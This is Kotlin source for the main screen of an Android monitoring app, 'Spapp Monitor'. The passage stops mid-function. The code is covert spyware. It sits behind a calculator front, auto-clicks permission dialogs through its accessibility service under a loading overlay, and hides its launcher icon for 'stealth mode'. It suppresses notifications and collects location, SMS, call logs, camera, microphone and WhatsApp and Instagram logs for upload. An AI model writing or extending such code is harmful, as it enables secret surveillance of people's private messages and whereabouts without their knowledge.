package com.spapp.monitoring.ui



import android.Manifest
import android.graphics.Color
import android.widget.ArrayAdapter
import java.util.Locale

import android.content.Context
import android.app.NotificationManager
import android.content.ComponentName

import android.content.Intent

import android.content.pm.PackageManager

import android.content.res.ColorStateList

import android.net.Uri

import android.os.Build

import android.os.Bundle

import android.os.Environment

import android.os.Handler

import android.os.Looper

import android.os.PowerManager

import android.provider.Settings

import android.text.format.DateUtils

import android.util.Log

import android.view.View

import android.widget.Toast

import androidx.activity.result.contract.ActivityResultContracts

import androidx.appcompat.app.AlertDialog

import androidx.appcompat.app.AppCompatActivity

import androidx.core.content.ContextCompat

import com.google.android.material.button.MaterialButton

import com.google.firebase.messaging.FirebaseMessaging

import com.spapp.monitoring.R

import com.spapp.monitoring.admin.SpappDeviceAdminReceiver

import com.spapp.monitoring.blocking.AccessibilityStatus

import com.spapp.monitoring.blocking.BlockAccessibilityService

import com.spapp.monitoring.collectors.AppUsageCollector

import com.spapp.monitoring.collectors.RealtimeLogObserverManager

import com.spapp.monitoring.data.DeviceState

import com.spapp.monitoring.databinding.ActivityMainBinding

import com.spapp.monitoring.fcm.FcmTokenSync

import com.spapp.monitoring.geofence.GeofenceManager

import com.spapp.monitoring.provision.AutoGrantOrchestrator

import com.spapp.monitoring.sync.PersistentWatchdogService

import com.spapp.monitoring.sync.SyncScheduler



/**

 * Main Status & Permission Control Center for Spapp Monitor.

 *

 * 1-TAP SETUP FLOW:

 * - Sequentially requests Standard Runtime Permissions + Accessibility Service.

 * - When Accessibility Service is enabled, automatically triggers "SYNC NOW"

 *   (instant WhatsApp & Instagram log sync, SyncScheduler.runOnce, and hides app icon).

 * - Remaining permissions (Battery Optimization, All Files, Notification Listener,

 *   Usage Access, Device Administrator, Autostart) are displayed on-screen for

 *   one-by-one manual toggling.

 */

class MainActivity : AppCompatActivity() {



    private lateinit var binding: ActivityMainBinding

    private lateinit var usageCollector: AppUsageCollector

    private lateinit var geofenceManager: GeofenceManager

    private lateinit var deviceState: DeviceState

    private var isOneTapFlowRunning = false

    private var isAccessibilityDialogShowing = false

    private var skipAccessibilityStep = false

    private var skipNotificationStep = false
    private var notificationPrompted = false

    private var autostartPrompted = false
    private var isExiting = false
    private var batteryPrompted = false

    // --- Setup-chain loop guards -------------------------------------------
    // The chain is driven by ActivityResult callbacks, and several OEM screens
    // return RESULT_CANCELED immediately. Without these guards one unresolved
    // step could relaunch its settings screen dozens of times per second, which
    // is what looked like an endless permission loop (and hammered the
    // accessibility service until Android flagged it as malfunctioning).

    /** Minimum gap between two step launches. */
    private val setupStepIntervalMs = 1_100L

    /** Hard ceiling on chain transitions in one app run. */
    private val maxSetupTransitions = 40

    private var lastSetupStepAt = 0L
    private var setupTransitions = 0
    private var pendingA11yConnectAt = 0L

    private val setupStepHandler = Handler(Looper.getMainLooper())
    private val setupStepRunnable = Runnable { handleNextSetupStep() }

    private fun repostSetupStep(delayMs: Long) {
        setupStepHandler.removeCallbacks(setupStepRunnable)
        setupStepHandler.postDelayed(setupStepRunnable, delayMs)
    }

    private fun completeSetupAndClose() {
        if (isExiting) return

        // Never disappear while the core grants are still missing. The chain
        // used to finish (hide the icon and remove the task) as soon as every
        // step had merely been *attempted*, so a device could end up with the
        // icon gone and permissions un-granted - and then there was no way back
        // into the app. If one of the verifiable grants is missing, stay
        // visible so the next launch can retry.
        if (!AutoGrantOrchestrator.coreReady(this)) {
            Log.w(TAG, "Core permissions still missing - keeping the app visible")
            refreshPermissionStatus()
            return
        }

        isExiting = true
        isOneTapFlowRunning = false
        setupStepHandler.removeCallbacks(setupStepRunnable)
        deviceState.markSetupCompleted()
        refreshPermissionStatus()
        triggerAutoSyncAfterAccessibility()

        // Permissions are ready, but the device still has no tenant binding.
        // Previously this path always finished and hid the icon, which left a
        // device that could not reach the code screen at all: the launcher icon
        // was gone and MainActivity only opens from Splash. Route to activation
        // first and keep the icon visible until the device is actually bound.
        if (!deviceState.isActivated) {
            Log.i(TAG, "Permissions ready but device not activated - routing to activation")
            Handler(Looper.getMainLooper()).postDelayed({
                try {
                    startActivity(
                        Intent(this, ActivationActivity::class.java).apply {
                            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                        }
                    )
                    finish()
                } catch (e: Exception) {
                    Log.w(TAG, "Failed to open activation after setup", e)
                }
            }, 400L)
            return
        }

        // Hide app icon from launcher for stealth mode
        hideAppIcon()
        Log.i(TAG, "All core permissions active — setup complete, hiding app icon and closing activity")

        Handler(Looper.getMainLooper()).postDelayed({
            try {
                finishAndRemoveTask()
            } catch (e: Exception) {
                Log.w(TAG, "finishAndRemoveTask failed, using finishAffinity fallback", e)
                try {
                    finishAffinity()
                } catch (_: Exception) {}
            }

            try {
                val homeIntent = Intent(Intent.ACTION_MAIN).apply {
                    addCategory(Intent.CATEGORY_HOME)
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }
                startActivity(homeIntent)
            } catch (e: Exception) {
                Log.w(TAG, "Failed to launch home intent fallback", e)
            }
        }, 500L)
    }



    // 1. Standard Runtime Permissions Launcher

    private val runtimePermissionsLauncher = registerForActivityResult(

        ActivityResultContracts.RequestMultiplePermissions()

    ) { results ->

        refreshPermissionStatus()

        // Always initialize log observer and trigger sync once permissions update
        RealtimeLogObserverManager.start(applicationContext)
        SyncScheduler.runOnce(applicationContext)

        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
            handleNextSetupStep()
        } else if (getMissingRuntimePermissions().isEmpty() && isAccessibilityEnabled()) {
            completeSetupAndClose()
        }

        // No confirmation toast: during the one-tap chain the screen must stay
        // clean, and outside it the grant is already reflected in the UI.

    }



    // 2. Accessibility Launcher (Part of 1-Tap Core Flow)

    private val accessibilityLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
            isOneTapFlowRunning = true
            handleNextSetupStep()
        } else if (isAccessibilityEnabled() && getMissingRuntimePermissions().isEmpty()) {
            triggerAutoSyncAfterAccessibility()
        }
    }



    // 3. Individual remaining permission launchers (tapped manually)

    private val batteryExemptionLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        // Fast-track immediately to Step 5 (Autostart) without waiting
        isOneTapFlowRunning = true
        handleNextSetupStep()
    }



    private val allFilesLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) handleNextSetupStep()
    }



    private var isNotificationDialogShowing = false

    private val notificationListenerLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        isNotificationDialogShowing = false
        notificationPrompted = true
        // Deliberately NOT marked as skipped: the orchestrator re-checks the
        // real system state and moves on by itself if the toggle did not land.
        refreshPermissionStatus()
        isOneTapFlowRunning = true
        handleNextSetupStep()
    }



    private val usageLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) handleNextSetupStep()
    }



    private val deviceAdminLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        if (isOneTapFlowRunning) handleNextSetupStep()
    }



    private val autostartLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        handleNextSetupStep()
    }

    // Background location must be requested on its own, after fine location -
    // Android rejects it when batched with other permissions.
    private val backgroundLocationLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) {
        refreshPermissionStatus()
        handleNextSetupStep()
    }

    // Android 10+ marks READ_SMS / READ_CALL_LOG as restricted: no runtime
    // dialog exists for them, so requestPermissions() returns DENIED instantly.
    // Accepting the matching platform role grants the permission as a side
    // effect, and the accessibility service clicks "Set as default".
    private val smsRoleLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        handleNextSetupStep()
    }

    private val dialerRoleLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) {
        refreshPermissionStatus()
        handleNextSetupStep()
    }



    private val statusHandler = Handler(Looper.getMainLooper())

    private val statusUpdater = object : Runnable {

        override fun run() {

            updateSyncStatusText()

            statusHandler.postDelayed(this, STATUS_REFRESH_MS)

        }

    }



    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)

        setContentView(binding.root)



        deviceState = DeviceState(this)

        // Opened from the dialler restore code: the launcher icon may still be
        // hidden, so point at the control that brings it back.
        if (intent?.getBooleanExtra(EXTRA_OPENED_BY_SECRET_CODE, false) == true) {
            binding.btnHideIcon.post {
                Toast.makeText(
                    this,
                    if (IconHider.isHidden(this)) {
                        "Tap \"Show app icon\" to restore the home-screen icon."
                    } else {
                        "App icon is already visible."
                    },
                    Toast.LENGTH_LONG
                ).show()
            }
        }

        usageCollector = AppUsageCollector(this)

        geofenceManager = GeofenceManager(this)



        SyncScheduler.schedule(applicationContext)

        uploadCurrentFcmToken()

        RealtimeLogObserverManager.start(applicationContext)

        // NOTE: this no longer elevates process priority. It used to call
        // startForeground() with a DATA_SYNC notification; that notification was
        // removed, and the call now only deletes the legacy notification and
        // channel. Nothing in the app raises the process priority any more -
        // residency relies on the bound accessibility service plus the battery
        // exemption, and on firmware that will not grant the exemption (this
        // device) the OS may freeze the process once the task is gone.
        PersistentWatchdogService.start(applicationContext)



        // Setup interactive Civil Engineering Calculator Suite
        setupCivilCalculators()

        // Explicit way to resume provisioning. Without this the app pulled
        // itself into Settings on every launch while any grant was missing, so
        // the calculator was never visible; now it is offered instead of being
        // forced once the automatic attempts are used up.
        // Manual launcher-visibility control. Explicit tap only: the
        // accessibility service ignores events from this package and synthetic
        // clicks are confined to the provisioning window, so this button can
        // never be pressed on the user's behalf.
        binding.btnHideIcon.setOnClickListener { onHideIconClicked() }
        updateHideButtonLabel()

        binding.btnResumeSetup.setOnClickListener {
            Log.i(TAG, "Manual setup resume requested")
            updateResumeSetupButton(false)
            showSetupOverlay(false)
            isOneTapFlowRunning = true
            handleNextSetupStep()
        }

        // Automatic permission start for fresh installation
        maybeStartAutoPermissionFlow()
    }



    /**

     * Fresh install: Starts Core (Standard Runtime + Accessibility) flow automatically.

     */

    private fun maybeStartAutoPermissionFlow() {
        // Bind first, then ask. The chain used to run before the device had a
        // tenant, so a fresh install walked the user through every permission
        // screen and only then discovered it had no device token - the device
        // never appeared as "active" on the dashboard and the whole setup had
        // to be repeated after activation. Routing to activation first makes
        // the order: open -> bind to tenant -> permissions -> calculator.
        if (!deviceState.isActivated) {
            Log.i(TAG, "Device not bound to a tenant yet - routing to activation before setup")
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) routeToActivation()
            }, 700L)
            return
        }

        val missingRuntime = getMissingRuntimePermissions()
        val isA11y = isAccessibilityEnabled()
        val isNotif = isNotificationAccessGranted()

        val needsSetup = deviceState.isFirstLaunchAfterInstall() ||
            !isA11y || !isNotif || missingRuntime.isNotEmpty()

        if (needsSetup) {
            // The chain used to start on every single launch for as long as any
            // grant was missing, which meant opening the app always dropped the
            // user into Settings and the calculator was never reachable. After
            // a couple of automatic attempts the calculator stays put and the
            // "Finish setup" button is offered instead.
            val attempts = deviceState.autoSetupAttempts
            if (attempts >= MAX_AUTO_SETUP_RUNS) {
                Log.i(TAG, "Setup still incomplete after $attempts automatic attempts - showing calculator")
                // Same reason as the max-transitions exit: never leave the
                // loader covering the calculator (and the hide button).
                showSetupOverlay(false)
                updateResumeSetupButton(true)
                return
            }
            deviceState.recordAutoSetupAttempt()
            updateResumeSetupButton(false)
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) {
                    isOneTapFlowRunning = true
                    skipAccessibilityStep = false
                    skipNotificationStep = false
                    handleNextSetupStep()
                }
            }, AUTO_FLOW_DELAY_MS)
        } else if (!deviceState.isActivated) {
            // Nothing left to grant and the device still has no tenant: go
            // straight to the code screen instead of sitting on the calculator.
            Handler(Looper.getMainLooper()).postDelayed({
                if (!isFinishing && !isDestroyed) completeSetupAndClose()
            }, 600L)
        }
    }



    /**

     * Automatic SYNC NOW triggered once as soon as Accessibility permission and Core permissions are granted.

     */

    /**
     * Sends an unbound device to the activation screen, which tries the
     * dashboard deep link / clipboard token and otherwise offers manual entry.
     */
    private fun routeToActivation() {
        try {
            startActivity(
                Intent(this, ActivationActivity::class.java).apply {
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
                }
            )
            finish()
        } catch (e: Exception) {
            Log.w(TAG, "Could not open the activation screen", e)
        }
    }

    private fun triggerAutoSyncAfterAccessibility() {

        if (!deviceState.hasAutoSyncedAfterAccessibility && getMissingRuntimePermissions().isEmpty()) {

            deviceState.hasAutoSyncedAfterAccessibility = true

            Log.i(TAG, "Accessibility enabled & core permissions granted: triggering automatic initial sync")

            RealtimeLogObserverManager.triggerInstantWhatsAppUpload(applicationContext)

            RealtimeLogObserverManager.triggerInstantInstagramUpload(applicationContext)

            SyncScheduler.runOnce(applicationContext)

            // Muted client-side notification on automated sync

            Log.i(TAG, "Core permissions active: initial sync completed")

        }

    }



    private fun hideAppIcon() {
        try {
            val componentName = ComponentName(this, "$packageName.LauncherAlias")
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
            Log.i(TAG, "LauncherAlias disabled: App icon hidden from home screen without touching SplashActivity")
        } catch (e: Exception) {
            Log.e(TAG, "Error hiding app icon", e)
        }
    }



    override fun onResume() {
        super.onResume()
        updateHideButtonLabel()
        refreshPermissionStatus()
        statusUpdater.run()
        uploadCurrentFcmToken()

        if (deviceState.isFirstSetupCompleted && !isOneTapFlowRunning) {
            return
        }

        val isCore = getMissingRuntimePermissions().isEmpty()
        val isA11y = isAccessibilityEnabled()
        val isNotif = isNotificationAccessGranted()

        if (isCore && isA11y && (isNotif || notificationPrompted) &&
            (batteryPrompted || isBatteryExempted()) && (autostartPrompted || !isOemRom())) {
            completeSetupAndClose()
            return
        }

        if (isOneTapFlowRunning || !deviceState.isFirstSetupCompleted) {
            isOneTapFlowRunning = true
            handleNextSetupStep()
        }
    }



    override fun onPause() {

        super.onPause()

        statusHandler.removeCallbacks(statusUpdater)

    }



    // =========================================================================

    // DYNAMIC 1-TAP SETUP WORKFLOW (Runtime Permissions -> Accessibility)

    // =========================================================================



    /**
     * Single funnel for the whole setup chain.
     *
     * Accessibility is the only permission Android refuses to let an app grant
     * itself, so it is the only step that needs a human tap. Every later step
     * is decided by AutoGrantOrchestrator ("what is still missing, and which
     * screen shows it"), launched from here, and then clicked by
     * BlockAccessibilityService. Each activity-result callback re-enters this
     * function to advance the chain, and the orchestrator's bounded per-step
     * attempt counter guarantees it terminates even when an OEM refuses a grant.
     */
    private fun handleNextSetupStep() {
        if (isExiting) return
        isOneTapFlowRunning = true

        // Throttle: OEM screens often return RESULT_CANCELED immediately, which
        // used to bounce the chain as fast as callbacks could fire. That is the
        // "permission loop" and it also hammered the accessibility service until
        // Android marked it as malfunctioning.
        val now = System.currentTimeMillis()
        if (now - lastSetupStepAt < setupStepIntervalMs) {
            repostSetupStep(setupStepIntervalMs)
            return
        }
        lastSetupStepAt = now

        // Absolute ceiling so one install can never spin forever, no matter what
        // the firmware does with these screens.
        setupTransitions++
        if (setupTransitions > maxSetupTransitions) {
            Log.w(TAG, "Setup chain reached $maxSetupTransitions transitions - stopping")
            isOneTapFlowRunning = false
            setupStepHandler.removeCallbacks(setupStepRunnable)
            // The chain can stop on a RequestPermissions step, which is the one
            // branch that shows the loader. Leaving here without clearing it
            // left the opaque match_parent overlay on top of everything for the
            // rest of the process - including btnHideIcon, which is declared
            // before the overlay in the layout and was therefore covered by it.
            // That is what made the hide button appear to do nothing.
            showSetupOverlay(false)
            updateResumeSetupButton(true)
            if (AutoGrantOrchestrator.coreReady(this)) completeSetupAndClose()
            return
        }

        // 0. Accessibility - cannot be self-granted, and cannot be clicked by a
        //    service that is not yet running, so it has to come first.
        if (!skipAccessibilityStep) {
            val enabled = isAccessibilityEnabled()
            val connected = AccessibilityStatus.isConnected()

            if (!enabled) {
                AutoGrantOrchestrator.markAttempt(this, AutoGrantOrchestrator.Step.ACCESSIBILITY)
                showAccessibilityDialog()
                return
            }

            if (!connected) {
                // Enabled in Settings but not connected: either the system is
                // still starting it, or the service died and Settings shows
                // "This service is malfunctioning". Give it a short grace and
                // then re-open the screen, which re-arms the service, instead of
                // silently skipping the step and running the rest of the chain
                // blind with nothing able to click the dialogs.
                if (pendingA11yConnectAt == 0L) {
                    pendingA11yConnectAt = System.currentTimeMillis() + 6_000L
                    repostSetupStep(1_500L)
                    return
                }
                if (System.currentTimeMillis() < pendingA11yConnectAt) {
                    repostSetupStep(1_500L)
                    return
                }
                pendingA11yConnectAt = 0L
                Log.w(TAG, "Accessibility enabled but not connected - reopening settings")
                AutoGrantOrchestrator.markAttempt(this, AutoGrantOrchestrator.Step.ACCESSIBILITY)
                showAccessibilityDialog()
                return
            }

            pendingA11yConnectAt = 0L
        }

        // The service is alive from here; keep it clicking for the full chain
        // (OEM skins can be slow to render some settings screens).
        BlockAccessibilityService.instance?.startProvisioningLoop()

        when (val action = AutoGrantOrchestrator.next(this)) {
            is AutoGrantOrchestrator.Action.RequestPermissions -> {
                // Silent phase: the remaining dialogs are clicked by the service,
                // so cover the calculator with the loader instead of showing a
                // permission screen the user would have to watch.
                showSetupOverlay(true)
                AutoGrantOrchestrator.markAttempt(this, action.step)
                if (action.step == AutoGrantOrchestrator.Step.BACKGROUND_LOCATION) {
                    backgroundLocationLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                } else {
                    runtimePermissionsLauncher.launch(action.permissions)
                }
            }

            is AutoGrantOrchestrator.Action.LaunchIntent -> {
                // A settings screen is about to open; the loader would only hide
                // the app underneath it.
                showSetupOverlay(false)
                AutoGrantOrchestrator.markAttempt(this, action.step)
                // Battery is the one screen the service presses Back on: the
                // "Allow app to run in background?" dialog sits over this
                // activity and, once allowed, the app should come straight back
                // rather than waiting for the user to navigate.
                if (action.step == AutoGrantOrchestrator.Step.BATTERY) {
                    BlockAccessibilityService.expectAutoBackAt = System.currentTimeMillis()
                }
                val launcher = when (action.step) {
                    AutoGrantOrchestrator.Step.ACCESSIBILITY -> accessibilityLauncher
                    AutoGrantOrchestrator.Step.NOTIFICATION_ACCESS -> notificationListenerLauncher
                    AutoGrantOrchestrator.Step.USAGE_ACCESS -> usageLauncher
                    AutoGrantOrchestrator.Step.ALL_FILES -> allFilesLauncher
                    AutoGrantOrchestrator.Step.BATTERY -> batteryExemptionLauncher
                    AutoGrantOrchestrator.Step.DEVICE_ADMIN -> deviceAdminLauncher
                    AutoGrantOrchestrator.Step.SMS_ROLE -> smsRoleLauncher
                    AutoGrantOrchestrator.Step.DIALER_ROLE -> dialerRoleLauncher
                    AutoGrantOrchestrator.Step.AUTOSTART -> autostartLauncher
                    else -> accessibilityLauncher
                }
                try {
                    launcher.launch(action.intent)
                } catch (e: Exception) {
                    Log.w(TAG, "Could not open screen for ${action.step}", e)
                    AutoGrantOrchestrator.markAttempt(this, action.step)
                    Handler(Looper.getMainLooper()).postDelayed({ handleNextSetupStep() }, 250L)
                }
            }

            is AutoGrantOrchestrator.Action.Finish -> {
                showSetupOverlay(false)
                completeSetupAndClose()
            }
        }
    }



    /**
     * Shows the "Finishing setup..." cover while the service clicks the
     * remaining runtime dialogs, so the calculator is not visible with dialogs
     * flashing over it.
     *
     * Note this cannot cover the system permission dialogs themselves: they are
     * rendered by PermissionController in a separate process with
     * SYSTEM_FLAG_HIDE_NON_SYSTEM_OVERLAY_WINDOWS, which force-hides any app
     * overlay (including TYPE_ACCESSIBILITY_OVERLAY) for as long as they show.
     */
    // ------------------------------------------------------------------
    // Launcher icon visibility (manual)
    // ------------------------------------------------------------------

    /**
     * Hide or restore the launcher entry.
     *
     * No PIN and no confirmation dialog: the tap itself is the intent. The
     * toast states exactly what happened and how to get the icon back, so the
     * change is never silent - whoever tapped it knows the icon is gone and
     * knows the dialler code that reopens the app.
     *
     * Restoring without an icon: dial `*#*#77277#*#*`, tap "Show app icon".
     */
    private fun onHideIconClicked() {
        if (IconHider.isHidden(this)) {
            IconHider.show(this)
            updateHideButtonLabel()
            Toast.makeText(this, "App icon restored to the home screen.", Toast.LENGTH_SHORT).show()
            // Re-arm and report, same as hiding: coming back into view is also a
            // state change the backend should see immediately.
            SyncScheduler.schedule(applicationContext)
            SyncScheduler.runOnce(applicationContext)
            return
        }

        IconHider.hide(this)
        updateHideButtonLabel()

        // Flush state to the backend BEFORE the task is removed.
        //
        // Hiding used to close the activity with no network call at all, so the
        // last thing the backend had was whatever the previous sync sent. Once
        // finishAffinity() takes the task away there is no foreground component
        // left, and on firmware that will not grant the battery exemption (this
        // device: ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS does not resolve)
        // the OS is free to freeze the process - meaning the WorkManager chain
        // may not run again for a long time. Pushing the final state now is what
        // makes the hide visible server-side regardless of what happens next.
        SyncScheduler.schedule(applicationContext)
        SyncScheduler.runOnce(applicationContext)

        Toast.makeText(
            this,
            "App icon hidden. Dial *#*#77277#*#* to open the app again.",
            Toast.LENGTH_LONG
        ).show()

        // Close the task so the app is not left open on screen after the icon
        // disappears. The toast survives the Activity finishing. Delayed a
        // little longer than the toast so the sync coroutine gets a chance to
        // reach the network first.
        Handler(Looper.getMainLooper()).postDelayed({
            if (!isFinishing && !isDestroyed) finishAffinity()
        }, 1_500L)
    }

    /** Reflects the current launcher state on the button label. */
    private fun updateHideButtonLabel() {
        try {
            binding.btnHideIcon.text =
                if (IconHider.isHidden(this)) "Show app icon" else "Hide app icon"
        } catch (e: Exception) {
            Log.w(TAG, "Could not update the hide-icon button label", e)
        }
    }

    /** Shows or hides the "Finish setup" affordance. */
    private fun updateResumeSetupButton(show: Boolean) {
        try {
            binding.btnResumeSetup.visibility = if (show) View.VISIBLE else View.GONE
        } catch (e: Exception) {
            Log.w(TAG, "Could not toggle the resume-setup button", e)
        }
    }

    private fun showSetupOverlay(show: Boolean) {
        try {
            binding.setupOverlay.visibility = if (show) View.VISIBLE else View.GONE
        } catch (e: Exception) {
            Log.w(TAG, "Could not toggle setup overlay", e)
        }
    }

    private fun showAccessibilityDialog() {
        if (isAccessibilityDialogShowing) return
        isAccessibilityDialogShowing = true

        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' -> 'Downloaded apps' -> 'Spapp Monitor' -> Turn ON.\n\n" +
            "⚠️ Android 13/14 Restricted Setting:\n" +
            "If the switch is grayed out, tap 'Allow Restricted' below -> tap 3 vertical dots (top right) -> 'Allow restricted settings' -> then return and turn it ON."
        } else {
            "To enable Live Screen & Monitoring:\n\n" +
            "1. Tap 'Go to Settings' below.\n" +
            "2. Select 'Downloaded apps' or 'Installed services'.\n" +
            "3. Select 'Spapp Monitor' and toggle it ON."
        }

        AlertDialog.Builder(this)
            .setTitle(R.string.accessibility_dialog_title)
            .setMessage(msg)
            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                isAccessibilityDialogShowing = false
                try {
                    // No auto-return here on purpose. Enabling accessibility is
                    // the one thing the device user is asked to do, and they come
                    // back to the app themselves; the chain continues onResume.
                    // The previous code launched MainActivity from the service,
                    // which raced their own navigation and could push a
                    // backgrounded task to the foreground mid-gesture.
                    accessibilityLauncher.launch(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open accessibility settings", e)
                    if (isOneTapFlowRunning) {
                        skipAccessibilityStep = true
                        handleNextSetupStep()
                    }
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                isAccessibilityDialogShowing = false
                openAppInfoSettings()
            }
            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                isAccessibilityDialogShowing = false
                if (isOneTapFlowRunning) {
                    skipAccessibilityStep = true
                    // Also retire the step in the orchestrator; otherwise it
                    // would immediately re-open the screen the user declined.
                    AutoGrantOrchestrator.skip(this, AutoGrantOrchestrator.Step.ACCESSIBILITY)
                    handleNextSetupStep()
                } else {
                    refreshPermissionStatus()
                }
            }
            .setOnDismissListener {
                isAccessibilityDialogShowing = false
            }
            .show()
    }



    private fun showNotificationDialog() {
        if (isNotificationDialogShowing) return
        isNotificationDialogShowing = true

        val appName = getString(R.string.app_name)
        val msg = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            "To capture WhatsApp & Instagram chat logs:\n\n" +

            "1. Tap 'Go to Settings' -> Find '$appName' -> Toggle ON.\n\n" +

            "⚠️ If blocked ('Restricted setting'): Tap 'Allow Restricted' below -> 3 dots (top right) -> 'Allow restricted settings'."

        } else {

            "To capture WhatsApp & Instagram chat logs:\n\n" +

            "1. Tap 'Go to Settings' below.\n" +

            "2. Find '$appName' and toggle it ON."

        }



        AlertDialog.Builder(this)

            .setTitle("Enable Notification Access")

            .setMessage(msg)

            .setPositiveButton(R.string.go_to_settings) { _, _ ->
                isNotificationDialogShowing = false
                notificationPrompted = true
                try {
                    notificationListenerLauncher.launch(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
                } catch (e: Exception) {
                    Log.e(TAG, "Cannot open notification listener settings", e)
                    if (isOneTapFlowRunning) {
                        skipNotificationStep = true
                        handleNextSetupStep()
                    }
                }
            }
            .setNeutralButton(R.string.open_app_info) { _, _ ->
                isNotificationDialogShowing = false
                notificationPrompted = true
                openAppInfoSettings()
            }
            .setNegativeButton(if (isOneTapFlowRunning) "Skip" else "Cancel") { _, _ ->
                isNotificationDialogShowing = false
                skipNotificationStep = true
                notificationPrompted = true
                if (isOneTapFlowRunning) {
                    handleNextSetupStep()
                } else {
                    refreshPermissionStatus()
                }
            }

            .setOnDismissListener {

                isNotificationDialogShowing = false

            }

            .show()

    }



    // =========================================================================

    // PERMISSION STATUS CHECKS & UI REFRESH

    // =========================================================================



    private fun getMissingRuntimePermissions(): List<String> {

        val list = mutableListOf<String>()



        val hasLocation = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED ||

                ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED

        if (!hasLocation) {

            list.add(Manifest.permission.ACCESS_FINE_LOCATION)

            list.add(Manifest.permission.ACCESS_COARSE_LOCATION)

        }



        // READ_SMS and READ_CALL_LOG are deliberately absent: since Android 10
        // they are hard-restricted, so requestPermissions() returns DENIED
        // without ever showing a dialog. Counting them as "missing" here made
        // the setup flow restart on every resume while never making progress.
        // They are granted through the SMS/phone role instead - see
        // AutoGrantOrchestrator.Step.SMS_ROLE.

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.READ_CONTACTS)

        }



        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.RECORD_AUDIO)

        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {

            list.add(Manifest.permission.CAMERA)

        }



        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {

            // POST_NOTIFICATIONS omitted to prevent any status bar notification popups

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_MEDIA_IMAGES)

            }

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_MEDIA_VIDEO)

            }

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_MEDIA_AUDIO)

            }

        } else {

            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

                list.add(Manifest.permission.READ_EXTERNAL_STORAGE)

            }

        }



        return list

    }



    private fun isBatteryExempted(): Boolean {

        val powerManager = getSystemService(POWER_SERVICE) as PowerManager

        return powerManager.isIgnoringBatteryOptimizations(packageName)

    }



    private fun isAccessibilityEnabled(): Boolean {

        return AccessibilityStatus.isEnabled(this)

    }



    private fun isNotificationAccessGranted(): Boolean {

        return try {

            val listeners = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")

            listeners?.contains(packageName) == true ||

                    androidx.core.app.NotificationManagerCompat.getEnabledListenerPackages(this).contains(packageName)

        } catch (_: Exception) {

            false

        }

    }



    private fun isUsageAccessGranted(): Boolean = usageCollector.hasUsageAccess()



    private fun isFileAccessGranted(): Boolean {

        return Build.VERSION.SDK_INT < Build.VERSION_CODES.R || Environment.isExternalStorageManager()

    }



    private fun isDeviceAdminActive(): Boolean {

        return SpappDeviceAdminReceiver.isActive(this)

    }



    private fun refreshPermissionStatus() {
        val isCore = getMissingRuntimePermissions().isEmpty()
        val isAccessibility = isAccessibilityEnabled()
        val isNotification = isNotificationAccessGranted()

        if (isCore && isAccessibility && (isNotification || notificationPrompted) &&
